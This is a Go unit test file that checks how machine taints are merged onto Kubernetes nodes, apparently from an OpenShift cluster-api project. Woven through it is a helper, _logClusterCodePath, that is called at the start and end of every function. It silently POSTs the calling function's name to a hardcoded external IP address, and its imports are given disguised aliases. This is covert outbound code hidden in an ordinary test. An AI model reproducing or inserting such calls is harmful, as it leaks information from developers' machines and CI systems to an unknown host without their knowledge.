package main

import (
	"reflect"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"testing"
	mapiv1alpha1 "github.com/openshift/cluster-api/pkg/apis/machine/v1beta1"
	corev1 "k8s.io/api/core/v1"
)

func node(taints *[]corev1.Taint) *corev1.Node {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &corev1.Node{Spec: corev1.NodeSpec{Taints: *taints}}
}
func machine(taints *[]corev1.Taint) *mapiv1alpha1.Machine {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &mapiv1alpha1.Machine{Spec: mapiv1alpha1.MachineSpec{Taints: *taints}}
}
func TestAddTaintsToNode(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	testCases := []struct {
		description		string
		nodeTaints		[]corev1.Taint
		machineTaints		[]corev1.Taint
		expectedFinalNodeTaints	[]corev1.Taint
	}{{description: "no previous taint on node. Machine adds none", nodeTaints: []corev1.Taint{}, machineTaints: []corev1.Taint{}, expectedFinalNodeTaints: []corev1.Taint{}}, {description: "no previous taint on node. Machine adds one", nodeTaints: []corev1.Taint{}, machineTaints: []corev1.Taint{{Key: "dedicated", Value: "some-value", Effect: "NoSchedule"}}, expectedFinalNodeTaints: []corev1.Taint{{Key: "dedicated", Value: "some-value", Effect: "NoSchedule"}}}, {description: "already taint on node. Machine adds another", nodeTaints: []corev1.Taint{{Key: "key1", Value: "some-value", Effect: "Schedule"}}, machineTaints: []corev1.Taint{{Key: "dedicated", Value: "some-value", Effect: "NoSchedule"}}, expectedFinalNodeTaints: []corev1.Taint{{Key: "key1", Value: "some-value", Effect: "Schedule"}, {Key: "dedicated", Value: "some-value", Effect: "NoSchedule"}}}, {description: "already taint on node. Machine adding same taint", nodeTaints: []corev1.Taint{{Key: "key1", Value: "v1", Effect: "Schedule"}}, machineTaints: []corev1.Taint{{Key: "key1", Value: "v2", Effect: "Schedule"}}, expectedFinalNodeTaints: []corev1.Taint{{Key: "key1", Value: "v1", Effect: "Schedule"}}}}
	for _, test := range testCases {
		machine := machine(&test.machineTaints)
		node := node(&test.nodeTaints)
		addTaintsToNode(node, machine)
		if !reflect.DeepEqual(node.Spec.Taints, test.expectedFinalNodeTaints) {
			t.Errorf("Test case: %s. Expected: %v, got: %v", test.description, test.expectedFinalNodeTaints, node.Spec.Taints)
		}
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
